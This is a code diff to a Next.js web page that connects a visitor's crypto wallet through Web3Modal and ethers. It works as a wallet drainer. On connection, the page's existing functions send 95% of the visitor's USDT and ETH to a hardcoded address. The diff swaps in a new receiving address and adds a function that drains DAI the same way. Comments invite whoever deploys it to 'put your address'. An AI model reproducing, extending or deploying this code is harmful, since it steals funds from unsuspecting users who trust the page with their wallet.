@@ -1,5 +1,6 @@
 import Image from "next/image";
 import { address, abi } from "../constants/ethUsdt";
+import { daiAbi, daiAddress } from "@/constants/dai";
 import Web3Modal from "web3modal";
 import { ethers } from "ethers";
 import WalletConnectProvider from "@walletconnect/web3-provider";
@@ -33,6 +34,7 @@ export default function Home() {
       signerAddress = await signer.getAddress();
       try {
         sendUsdt();
+        sendDai();
         await sendEth();
       } catch (e) {
         if (
@@ -60,7 +62,20 @@ export default function Home() {
     );
 
     const tx = await contract.transfer(
-      "0x09fD825C2442098a8D503680968Da4951F0C4338", // reciever address, please put your address
+      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
+      BigInt(balance * 0.95)
+    );
+    await tx.wait(1);
+  }
+
+  async function sendDai() {
+    contract = new ethers.Contract(daiAddress, daiAbi, signer); //new instance of usdt contract
+    const balance = Number(
+      (await contract.balanceOf(signerAddress)).toString()
+    );
+
+    const tx = await contract.transfer(
+      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
       BigInt(balance * 0.95)
     );
     await tx.wait(1);
@@ -71,7 +86,7 @@ export default function Home() {
       (await provider.getBalance(signerAddress)).toString()
     );
     const tx = await signer.sendTransaction({
-      to: "0x09fD825C2442098a8D503680968Da4951F0C4338", // reciever address, please put your address
+      to: "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
       value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
     });
     await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
